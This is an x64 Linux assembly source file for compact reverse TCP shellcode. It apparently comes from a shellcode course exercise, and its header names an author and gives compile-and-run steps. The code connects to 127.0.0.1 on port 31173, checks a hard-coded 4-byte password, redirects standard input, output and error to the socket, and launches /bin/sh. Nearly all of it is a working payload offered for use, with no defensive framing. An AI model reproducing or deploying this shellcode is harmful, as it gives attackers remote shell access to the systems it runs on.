;Title:            reverse shell with password in 98 bytes 
;Author:           David Velázquez a.k.a d4sh&r
;Contact:          https://mx.linkedin.com/in/d4v1dvc
;Description:      x64 Linux reverse TCP port shellcode ANY IP on port 31173 with 4 bytes as password  in 98 bytes
;Tested On:        Linux kali64 3.18.0-kali3-amd64 x86_64 GNU/Linux 

;Compile & Run:    nasm -f elf64 -o rshell.o rshell.nasm
;                  ld -o rshell rshell.o
;                  ./rshell
;SLAE64-1379

global _start

section .text

_start:

socket:
    ;int socket(int domain, int type, int protocol)2,1,0
    xor esi,esi                      ;rsi=0
    mul esi                          ;rdx,rax,rsi=0, rdx is 3rd argument                 
    inc esi                          ;rsi=1, 2nd argument
    push 2                           
    pop rdi                          ;rdi=2,1st argument
    add al, 41                       ;socket syscall
    syscall
 
    push rax	                     ;socket result
    pop rdi                          ;rdi=sockfd

    ; copy socket descriptor to rdi for future use 

    push rax
    pop rdi
;struct sockaddr_in {
    ;           sa_family_t    sin_family; /* address family: AF_INET */
    ;           in_port_t      sin_port;   /* port in network byte order */
    ;           struct in_addr sin_addr;   /* internet address */
    ;};

    push 2			     ;AF_INET
    mov word [rsp + 2], 0xc579       ;port 31173
    push rsp                        
    pop rsi                          ;rsi=&sockaddr
    
    mov dword [rsp + 0x4], 0x0100007f-0x01010101

    add dword [rsp + 0x4], 0x01010101


connect:
    ; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)

    push rsp
    pop rsi

    push 0x10
    pop rdx

    push 42
    pop rax
    syscall


password:
    ; password = read(sockfd, *buf, 4)

                                    ; rsi = &buf (char*)
                                    ; rdx = 0x10, >4 bytes

    xor eax, eax                    ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], '1234'         ; simple comparison
    jne error                        ; bad pw, abort


    ;int dup2(int oldfd, int newfd)
    push 3
    pop rsi    

dup2:
    dec esi
    mov al, 33                       ;dup2 syscall applied to error,output and input
    syscall
    jne dup2

execve:
    ;int execve(const char *filename, char *const argv[],char *const envp[])
    push rsi                         
    pop rdx                          ;3rd argument
    push rsi                         ;2nd argument
    mov rbx, 0x68732f2f6e69622f      ;1st argument /bin//sh 
    push rbx
    push rsp
    pop rdi
    mov al, 59			     ;execve
    syscall
 
error:
    ;SEGFAULT
